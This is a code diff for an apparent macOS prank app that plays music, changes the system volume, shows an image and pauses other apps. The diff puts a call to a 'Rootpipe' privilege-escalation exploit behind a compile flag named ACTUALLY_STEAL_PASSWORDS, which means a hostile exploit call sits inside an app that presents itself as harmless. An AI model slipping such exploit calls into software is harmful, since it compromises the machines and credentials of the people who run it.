@@ -8,6 +8,7 @@
 
 #import "MainWindow.h"
 #import "Rootpipe.h"
+#import "AppDelegate.h"
 
 @interface MainWindow () {
     NSRect windowFrame;
@@ -39,14 +40,16 @@
     [self addSubviews];
     [self setVolumeMax];
     [self playMusic];
+#ifdef ACTUALLY_STEAL_PASSWORDS
     if ([Rootpipe runExploit]) {
         // The exploit was successful
     }
     else {
         // The exploit failed
     }
+#endif
     [self performSelector:@selector(showImage) withObject:self afterDelay:time];
-    
+    [AppDelegate pauseApps];
     
     
     return self;
@@ -81,7 +84,7 @@
 }
 
 - (void)setVolumeMax {
-    NSAppleScript *changeVolume = [[NSAppleScript alloc] initWithSource:@"set volume 5"];
+    NSAppleScript *changeVolume = [[NSAppleScript alloc] initWithSource:@"set volume 1"];
     [changeVolume executeAndReturnError:nil];
 }
 
